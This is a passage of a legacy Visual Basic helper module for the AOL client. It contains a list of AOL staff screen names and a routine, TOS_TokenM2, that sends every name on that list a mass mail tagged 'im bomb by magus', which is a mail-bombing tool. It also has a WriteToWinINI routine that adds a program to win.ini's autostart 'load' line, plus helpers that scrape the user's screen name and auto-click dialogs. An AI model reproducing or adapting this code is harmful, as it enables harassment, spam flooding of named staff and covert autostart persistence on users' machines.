List.AddItem "Rnger JNX"
List.AddItem "Rnger JOY"
List.AddItem "Rnger KIS"
List.AddItem "Rnger KIT"
List.AddItem "Rnger LDY"
List.AddItem "Rnger LEX"
List.AddItem "Rnger LLD"
List.AddItem "Rnger MAN"
List.AddItem "Rnger MCO"
List.AddItem "Rnger MEE"
List.AddItem "Rnger MGR"
List.AddItem "Rnger MGS"
List.AddItem "Rnger PAS"
List.AddItem "Rnger PEZ"
List.AddItem "Rnger PHL"
List.AddItem "Rnger PUP"
List.AddItem "Rnger RAT"
List.AddItem "Rnger RCT"
List.AddItem "Rnger RED"
List.AddItem "Rnger REG"
List.AddItem "Rnger RIC"
List.AddItem "Rnger ROB"
List.AddItem "Rnger ROQ"
List.AddItem "Rnger SEA"
List.AddItem "Rnger SHG"
List.AddItem "Rnger TCB"
List.AddItem "Rnger TEZ"
List.AddItem "Rnger TLC"
List.AddItem "Rnger TOM"
List.AddItem "Rnger UNI"
List.AddItem "Rnger VIP"
List.AddItem "Rnger WAB"
List.AddItem "Rnger WCW"
List.AddItem "Rnger WHO"
List.AddItem "Rnger WHY"
List.AddItem "Rnger WLF"
List.AddItem "Rnger WOW"
List.AddItem "Rnger XLT"
List.AddItem "VLA Abbot"
List.AddItem "VLA Adam"
List.AddItem "VLA Angel"
List.AddItem "VLA Becca"
List.AddItem "VLA BenB"
List.AddItem "VLA Bill"
List.AddItem "VLA Brad"
List.AddItem "VLA Brenda"
List.AddItem "VLA Brian"
List.AddItem "VLA Catsy"
List.AddItem "VLA Cheryl"
List.AddItem "VLA Cloud"
List.AddItem "VLA Cupid"
List.AddItem "VLA CWC"
List.AddItem "VLA Cyan"
List.AddItem "VLA Daniel"
List.AddItem "VLA Dave"
List.AddItem "VLA DaveM"
List.AddItem "VLA Debra"
List.AddItem "VLA Dennis"
List.AddItem "VLA Evans"
List.AddItem "VLA George"
List.AddItem "VLA Ghound"
List.AddItem "VLA Help"
List.AddItem "VLA Irish"
List.AddItem "VLA Jazz"
List.AddItem "VLA Joanie"
List.AddItem "VLA Judy"
List.AddItem "VLA Linda"
List.AddItem "VLA Mac"
List.AddItem "VLA Maria"
List.AddItem "VLA Mom"
List.AddItem "VLA Mykul"
List.AddItem "VLA Peggy"
List.AddItem "VLA Quilt"
List.AddItem "VLA Rhet"
List.AddItem "VLA RMPT"
List.AddItem "VLA Robbie"
List.AddItem "VLA Santa"
List.AddItem "VLA Scot"
List.AddItem "VLA Scout"
List.AddItem "VLA Shell"
List.AddItem "VLA Shy"
List.AddItem "VLA Signup"
List.AddItem "VLA Sioux"
List.AddItem "VLA Spark"
List.AddItem "VLA Spirit"
List.AddItem "VLA Stem"
List.AddItem "VLA Suzie"
List.AddItem "VLA Tac"
List.AddItem "VLA TerryS"
List.AddItem "VLA Tic"
List.AddItem "VLA Tim"
List.AddItem "VLA Toe"
List.AddItem "VLA Tracy"
List.AddItem "VLA Tree"
List.AddItem "VLA Tutor"
List.AddItem "VLA Varian"
List.AddItem "VLA Vicki"
List.AddItem "VLA Violet"
List.AddItem "VLA Walt"
List.AddItem "VLA Wiz"
List.AddItem "VLABrendan"
List.AddItem "VLACostelo"
List.AddItem "VLASupport"
List.AddItem "YTCC Blast"
List.AddItem "YTCC Blaze"
List.AddItem "YTCC Brain"
List.AddItem "YTCC Deez"
List.AddItem "YTCC Dew"
List.AddItem "YTCC FUN"
List.AddItem "YTCC Gate"
List.AddItem "YTCC Goofy"
List.AddItem "YTCC News"
List.AddItem "YTCC Night"
List.AddItem "YTCC Night"
List.AddItem "YTCC Scott"
List.AddItem "YTCC Stef"
List.AddItem "YTCC Trap"
List.AddItem "YTCC Wake"
List.AddItem "YTCC Web"
List.AddItem "YTCC Zach"
List.AddItem "YTCCMascot"
End Sub

Sub TOS_TokenM2 (who, List As Control, subject, MailMsg, Phrase)
TermGP who, Phrase
TermIMVio who, Phrase
x = KeyBrackets()
For i = 0 To List.ListCount - 1
names = List.List(i)
'•••··· BD [ultra] v¹·º [
AOL_SendMail names, subject, MailMsg + KeyEnter() + "<HTML><PRE><FONT  COLOR=" + x + "#0000ff" + x + " BACK=" + x + "#fefefe" + x + " SIZE=2><B>" + who + ":" + KeyTab() + "</FONT></FONT><FONT  COLOR=" + x + "#000000" + x + " BACK=" + x + "#FFFFFF" + x + " SIZE=3></B>" + Phrase + KeyTab() + "¤-[im bomb by magus-]¤</PRE></HTML>"
timeout .1
Next i

End Sub

Function trim_null (wstr As String)
'Trims null characters from a string
wstr = Trim(wstr)
Do Until xx = Len(wstr)
Let xx = xx + 1
Let this_chr = Asc(Mid$(wstr, xx, 1))
If this_chr > 31 And this_chr <> 256 Then Let wordd = wordd & Mid$(wstr, xx, 1)
Loop
trim_null = wordd

End Function

Function Trimnull (In$) As String
For x = 1 To Len(In$)
    If (Mid$(In$, x, 1) <> Chr$(0)) Then
        Total$ = Total$ + Mid$(In$, x, 1)
    Else
        GoTo NullDetect
    End If
Next
NullDetect:
Trimnull = Total$
End Function

Sub upchat ()
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "&About America Online")'Run Menu
timeout (.5)
aom = findwindow("_AOL_Modal", 0&)
CloseWin (aom)
End Sub

Function UserSN () As String
On Error Resume Next
buffa$ = String$(255, 0)
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
WEL% = findchildbytitle(MDI%, "Welcome, ")
If WEL% = 0 Then Exit Function
WTXT% = getwindowtext(WEL%, buffa$, &H20)
RM = Trim$(buffa$)
SearchStart = InStr(1, buffa$, ", ")
tempbuffa$ = Mid$(buffa$, SearchStart + 2)
LD = Trim$(tempbuffa$)
EXCLA = InStr(1, tempbuffa$, "!")
SN$ = Left$(tempbuffa$, EXCLA - 1):
UserSN = SN$
End Function

' This subroutine allows any Windows events to be processed.
' This may be necessary to solve any synchronization
' problems with Windows events.
'
' This subroutine can also be used to force a delay in
' processing.
Sub WaitForEventsToFinish (NbrTimes As Integer)
    Dim i As Integer

    For i = 1 To NbrTimes
        dummy% = DoEvents()
    Next i
End Sub

Sub WaitForMail ()
Dim timr As Long, begin As Double, ending As Double, dfc As Double

begin = Time
Do: DoEvents
listWnd = GetWindowFromClass(GetFocus(), "_AOL_Tree")       'Auto "New Mail" Fill Detector
GetScrollRange listWnd, 1, Lpminpos%, lpmaxpos%
kewl = lpmaxpos%
timeout (2)
listWnd = GetWindowFromClass(GetFocus(), "_AOL_Tree")       'Auto "New Mail" Fill Detector
GetScrollRange listWnd, 1, Lpminpos%, lpmaxpos%
If kewl = lpmaxpos% Then
    listWnd = GetWindowFromClass(GetFocus(), "_AOL_Tree")       'Auto "New Mail" Fill Detector
    GetScrollRange listWnd, 1, Lpminpos%, lpmaxpos%
    kewl = lpmaxpos%
    If kewl = lpmaxpos% Then Exit Sub
    End If
 Loop
  x = DoEvents()                'number of loops with identical
End Sub

Sub waitforok ()
'Waits for the AOL OK messages that popup up
Do
DoEvents
okw = findwindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If

DoEvents
Loop Until okw <> 0
   
    okb = findchildbytitle(okw, "OK")
    okd = sendmessagebynum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = sendmessagebynum(okb, WM_LBUTTONUP, 0, 0&)


End Sub

Function windowcaption (hWndd As Integer)
'Gets the caption of a window
Dim WindowText As String * 255
Dim getWinText As Integer
getWinText = getwindowtext(hWndd, WindowText, 255)
windowcaption = (WindowText)
End Function

Sub WriteToINI (SectionName$, SettingName$, Setting$, Directory$)
i = WritePrivateProfileString(SectionName$, UCase$(SettingName$), Setting$, Directory$)
End Sub

Sub WriteToWinINI (App$)
Call WriteToINI("windows", "load", App$, "c:\windows\win.ini")
End Sub

